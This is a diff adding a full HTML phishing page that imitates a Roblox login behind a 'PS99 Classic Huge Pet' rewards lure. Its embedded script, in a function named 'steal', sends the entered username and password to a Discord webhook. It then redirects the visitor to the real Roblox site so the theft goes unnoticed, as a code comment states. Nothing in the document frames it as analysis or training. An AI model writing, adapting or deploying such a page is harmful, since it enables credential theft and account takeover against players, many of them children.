@@ -1,1 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox | Login - Classic Update Rewards</title>
+    <style>
+        body { background-color: #f4f4f4; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { width: 95%; padding: 10px; background-color: #00b2ff; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        h2 { color: #333; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Login to Claim Rewards</h2>
+        <p>Verify your account for the PS99 Classic Huge Pet!</p>
+        <input type="text" id="user" placeholder="Username/Email/Phone">
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="steal()">Login</button>
+    </div>
+
+    <script>
+        async function steal() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const webhook = "('https://discord.com/api/webhooks/1564252855462928434/Tk7XDbFzOHjUaMsOBPpV8hC5qzFNmKhmb8qlivsVfuMDbA3z7zSlwSOwwPliSHEsTPbe";
+
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `🚨 **Snatched!** 🚨\nUser: ${u}\nPass: ${p}` })
+            });
+
+            // This sends them to the REAL roblox page so they don't suspect a thing
+            window.location.href = "https://www.roblox.com/home";
+        }
+    </script>
+</body>
+</html>
 
